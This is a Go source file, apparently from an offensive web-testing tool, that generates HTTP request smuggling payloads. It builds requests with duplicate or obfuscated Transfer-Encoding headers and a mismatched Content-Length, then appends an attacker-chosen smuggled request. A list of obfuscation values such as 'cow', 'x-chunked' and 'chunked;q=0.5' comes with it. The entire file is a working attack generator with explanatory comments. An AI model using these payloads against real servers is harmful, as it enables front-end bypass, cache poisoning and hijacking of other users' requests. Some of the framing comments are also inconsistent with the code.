package payload

import (
	"fmt"
	"strings"
)

// GenerateObfuscatedTE creates a CL.TE payload with obfuscated Transfer-Encoding header values.
//
// TECHNIQUE EXPLANATION:
// This variant exploits differences in how front-end and back-end servers parse
// non-standard Transfer-Encoding header values. Common obfuscation techniques include:
// - Transfer-Encoding: cow (unrecognized encoding)
// - Transfer-Encoding: chunked;q=0.5 (encoding with parameters)
// - Transfer-Encoding: x-chunked (vendor-specific prefix)
//
// The front-end may reject or ignore unknown TE values, while the backend
// might still interpret them as chunked encoding or process them differently.
//
// PAYLOAD STRUCTURE:
// - Content-Length: headers + small chunk
// - Transfer-Encoding: chunked (standard)
// - Transfer-Encoding: <obfuscated_value> (second TE header)
// - Some servers see the first TE, others see the second, creating desynchronization
//
// baseRequest: the request line + headers (without final CRLF)
// smoggledBody: the HTTP request to smuggle
// obfuscation: the obfuscation value (e.g., "cow", "x-chunked", "chunked;q=0.5")
func GenerateObfuscatedTE(baseRequest string, smoggledBody string, obfuscation string) string {
	var buf strings.Builder

	buf.WriteString(baseRequest)

	// Two Transfer-Encoding headers - creates parser ambiguity
	buf.WriteString("Transfer-Encoding: chunked\r\n")
	buf.WriteString(fmt.Sprintf("Transfer-Encoding: %s\r\n", obfuscation))

	// Content-Length covers only the visible part (like CL.TE)
	contentLengthValue := 4 + len("\r\n") // "5\r\n" + chunk delimiter
	buf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", contentLengthValue))

	// End headers
	buf.WriteString("\r\n")

	// Chunk: size (hex) + CRLF + data + CRLF
	buf.WriteString("5\r\n")
	buf.WriteString("0\r\n\r\n") // Chunk data
	buf.WriteString("0\r\n")     // End chunk indicator
	buf.WriteString("\r\n")

	// Smuggled request follows - backend will treat as start of next request
	buf.WriteString(smoggledBody)

	return buf.String()
}

// GenerateObfuscatedTEVariant creates an obfuscated TE payload with customizable format.
//
// This is a more flexible version that allows specifying exact header combinations.
//
// teHeaders: list of Transfer-Encoding header values to include
// baseRequest: the request line + headers (without final CRLF)
// smoggledBody: the HTTP request to smuggle
func GenerateObfuscatedTEVariant(baseRequest string, smoggledBody string, teHeaders []string) string {
	var buf strings.Builder

	buf.WriteString(baseRequest)

	// Add all Transfer-Encoding headers
	for _, teValue := range teHeaders {
		buf.WriteString(fmt.Sprintf("Transfer-Encoding: %s\r\n", teValue))
	}

	// Content-Length covers only the visible part
	contentLengthValue := 4 + len("\r\n")
	buf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", contentLengthValue))

	// End headers
	buf.WriteString("\r\n")

	// Chunk
	buf.WriteString("5\r\n")
	buf.WriteString("0\r\n\r\n")
	buf.WriteString("0\r\n")
	buf.WriteString("\r\n")

	// Smuggled request
	buf.WriteString(smoggledBody)

	return buf.String()
}

// ObfuscationPatterns defines common obfuscation patterns for Transfer-Encoding
var ObfuscationPatterns = []string{
	"cow",
	"x-chunked",
	"chunked;q=0.5",
	"zip",
	"deflate",
	"x-gzip",
	"identity",
	"*",
}
